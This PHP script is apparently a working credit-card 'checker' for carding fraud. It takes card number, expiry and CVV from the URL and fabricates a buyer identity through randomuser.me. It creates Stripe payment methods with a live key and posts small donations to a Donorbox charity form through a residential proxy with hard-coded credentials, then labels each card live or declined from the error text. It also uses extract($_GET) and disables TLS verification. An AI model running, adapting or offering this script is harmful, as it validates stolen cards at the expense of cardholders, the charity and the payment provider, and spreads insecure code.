<?php

extract($_GET);
function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    if (isset($str[1])) {
        $str = explode($end, $str[1]);
    }
    return $str[0];
}
$seperator = explode("|", $check);
$ccn = $seperator[0];
$bln = $seperator[1];
$thn = $seperator[2];
$cvv = $seperator[3];
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
    $name = $matches1[1][0];
    preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
    $last = $matches1[1][0];
    preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
    $email = $matches1[1][0];
    preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
    $street = $matches1[1][0];
    preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
    $city = $matches1[1][0];
    preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
    $state = $matches1[1][0];
    preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
    $phone = $matches1[1][0];
    preg_match_all("(\"postcode\":\"(.*)\")siU", $get, $matches1);
    if (isset($matches1[1][0])) {
    $postcode = $matches1[1][0];
}

$USERNAME = 'USER';
$PASSWORD = 'PASS';
$port = 22225;
$session = mt_rand();
$super_proxy = 'PROXY';
$url1 = 'https://api.stripe.com/v1/payment_methods';
$url2 = 'https://donorbox.org/donation';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, 'http://brd.superproxy.io:22225');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'brd-customer-hl_0b04e3ae-zone-proxydata:dk40dxcl1y7t');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]=Faheri+Nasedi&billing_details[address][postal_code]=34248&card[number]='.$ccn.'&card[cvc]='.$cvv.'&card[exp_month]='.$bln.'&card[exp_year]='.$thn.'&guid=9af94796-73ea-4355-bc9e-632023645a2a4cd3bb&muid=a107bb68-257d-4396-95e4-029c23e3484a4cd882&sid=44b5274b-8772-423e-8d85-5ce98a721822b17d0d&pasted_fields=number&payment_user_agent=stripe.js%2F2d3a08de7b%3B+stripe-js-v3%2F2d3a08de7b%3B+split-card-element&referrer=https%3A%2F%2Fdonorbox.org&time_on_page=174344&key=pk_live_1TiySUjG2VvU27ZhnX775lWtq4Gq45tuRo3f47l3fel2t9TuG0hHT2dc9IuyITSCdm8scWA6aQ50qIPoPZ8DZuMns009QRfWOPT');
$a = curl_exec($ch);
// echo $page;


$token = trim(strip_tags(getstr($a, 'id": "','"')));
$ip = trim(strip_tags(getstr($a, 'client_ip": "','"')));

echo $token;
echo $ip;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url2);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, 'http://brd.superproxy.io:22225');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'brd-customer-hl_0b04e3ae-zone-proxydata:dk40dxcl1y7t');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'utf8=%E2%9C%93&donation%5Bform_id%5D=63220&donation%5Bsms_message_id%5D=&donation%5Bform_version%5D=1.5&currency=usd&slug=project-fava&bf=fd8df300a8c386023abfef7b34235e7a&sf=s3cabr127j63220&idempotency_key_index=&new_indian_regulation=false&s=MTcxMDc&t=3MzgyNg&donation_type=stripe&donation%5Butm_params_attributes%5D%5Butm_source%5D=&donation%5Butm_params_attributes%5D%5Butm_medium%5D=&donation%5Butm_params_attributes%5D%5Butm_campaign%5D=&donation%5Butm_params_attributes%5D%5Butm_term%5D=&donation%5Butm_params_attributes%5D%5Butm_content%5D=&fee_amount=0.44&embedded_form=true&plan_duration=&other_currency=usd&donation%5Bfmv_payment_attributes%5D%5Bamount%5D=&donation%5Bfmv_payment_attributes%5D%5Bdescription%5D=&donation%5Bsuggested_text%5D=&donation%5Bcustom_amount%5D=3&donation%5Bdonation_honor_attributes%5D%5Bhonor_type%5D=honor&donation%5Bdonation_honor_attributes%5D%5Bhonoree_name%5D=&donation%5Bdonation_honor_attributes%5D%5Brecipient_name%5D=&donation%5Bdonation_honor_attributes%5D%5Bnotify_type%5D=email&donation%5Bdonation_honor_attributes%5D%5Brecipient_email%5D=&donation%5Bdonation_honor_attributes%5D%5Brecipient_message%5D=&donation%5Bcomment%5D=&donation%5Bfirst_name%5D=gahue&donation%5Blast_name%5D=hwjau&donation%5Banonymous_donation%5D=off&donation%5Bemail%5D=awdwaddd%40gmail.com&donation%5Bgdpr_consented%5D=on&ask_for_cover_fee=on&g-recaptcha-response-data%5Bdonation_create%5D=03AFcWeA7mLwP_C2pto_5eJ9hHAU3sHQn81R_MSNJHBFPHPIytuDmDubO_RsW2zBoWhEKsf9q5QZzgjlNkwk_c2AayL7YkCOzoEs0-i1lO2wEb8CbkYNaDjD3ytZrKqBV_NuDsFWjdRNrcqO53vMf02OYEP6CNzBTQw2igYtCxJGhGoStfVJBB6xvaowGKFDiMX84BDBeb-xc6ovJ5NJW84P2xPQ5lzh7q3LzD48o3_9zOmlXkoYI1NQPwK_maiILhvvP-hEm3u6s6cfGv2nrRRzpxiTPJzSAF7KDdXrlE4IsxiScoyFLue_sFzQ1i7btdhPzYO0z5pGdsLr8-AFJ1oR-uS5Tvmv0qaaWOKGWp_8h8KgwKMRmjiTyEom3lzyt0jAXMNa1FfOsFVxlcsU7ZT9euild8Y6tQVXuK95osQsT007F_s6Pzm0rQ0o5c1zWUlPczcvE3YpHUVBLnS1HDjhD8sU09vHtq51h8LKPWYKNnPQqv1dg1EyKuTt9Dj1kisi3DLxTp2p8B9YDUdUM603rBj_aR3__guaeKIJy3ZQfmYUlhbcqhetA4SBqxqpvB1HCslCrQZm5M7lrGzPm0qKFw6cMhEWuO5tUWtnuuYmlmQENVYvWkzzxTilER_8HMpPtfcKyIqUB9NboEOm2elADDLlSZqQXZqfSCkKAW_NQi-6YnwoqhTkL-a2IZHhkb8z4ubj16VX4MidYGKrFRvuoA1JNKXs36tg&g-recaptcha-response=&stripe_token=&stripe_pm_id='.$token.'T&stripe_pi_id=&stripe_public_key=pk_live_1TiySUjG2VvU27ZhnX775lWtq4Gq45tuRo3f47l3fel2t9TuG0hHT2dc9IuyITSCdm8scWA6aQ50qIPoPZ8DZuMns009QRfWOPT&ask_for_cover_fee=on
');
$c = curl_exec($ch);
// echo $page;

if (strpos($a, "Your card's security code is incorrect.")) {
    echo '<span class="badge badge-success">Correct</span> ' . $ccn . ' ' . $bln . ' ' . $thn . ' ' . $cvv . ' <b style="color: black;"> Live!
    ' . $bin . '(' . $banco . '-' . $nivel . ') NotSec! <br>';
}
else if(substr_count($c, 'incorrect_number') > 0){
    echo '<span class="badge badge-success">Correct</span> ' .$ccn. ' ' .$bln. ' ' .$thn. ' ' .$cvv. ' <b style="color: black;"> INVALID!<b>';
    exit();
}
else if(strpos($c, "Your card's security code is incorrect.")) {
    echo '<span class="badge badge-success">Correct</span> '.$ccn.' '.$bln.' '.$thn.' '.$cvv.' <b style="color: black;"> Have Problem With CVV<b>';
    // exit();
}
else if(strpos($c, "Your card does not support this type of purchase.")) {
    echo '<span class="badge badge-danger">Rejected</span> '.$ccn.' '.$bln.' '.$thn.' '.$cvv.' <b style="color: black;"> Not Support Purchase<b>';
    // exit();
}
else if(strpos($a, "Your card was declined.")) {
    echo '<span class="badge badge-danger">Rejected</span> '.$ccn.' '.$bln.' '.$thn.' '.$cvv.' <b style="color: black;"> Not Valid<b>';
    // exit();
}
else if(strpos($a, "Your card number is incorrect")) {
    echo '<span class="badge badge-danger">Rejected</span> '.$ccn.' '.$bln.' '.$thn.' '.$cvv.' <b style="color: black;"> Incorrect Number<b>';
    // exit();
}
else if(strpos($a, "Your card does not support this type of purchase.")) {
    echo '<span class="badge badge-danger">Rejected</span> '.$ccn.' '.$bln.' '.$thn.' '.$cvv.' <b style="color: black;"> Not Support Purchase<b>';
    // exit();
}
else if(strpos($a, "To confirm that you are not a spam bot, please click on the reCAPTCHA verification.")) {
    echo '<span class="badge badge-danger">Rejected</span> '.$ccn.' '.$bln.' '.$thn.' '.$cvv.' <b style="color: black;"> GOT VERIFY CAPTCHA<b>';
    // exit();
}
else if(strpos($c, "Your card was declined.")) {
    echo '<span class="badge badge-danger">Rejected</span> '.$ccn.' '.$bln.' '.$thn.' '.$cvv.' <b style="color: black;"> Not Valid<b>';
    // exit();
}
else if(strpos($c, "To confirm that you are not a spam bot, please click on the reCAPTCHA verification.")) {
    echo '<span class="badge badge-danger">Rejected</span> '.$ccn.' '.$bln.' '.$thn.' '.$cvv.' <b style="color: black;"> GOT VERIFY CAPTCHA<b>';
    // exit();
}
 else {
    echo '<span class="badge badge-danger">Rejected</span> '.$ccn.' '.$bln.' '.$thn.' '.$cvv.' <b style="color: black;"> Uknown VCC<b>';
    echo ''.$c.'';
}
?>
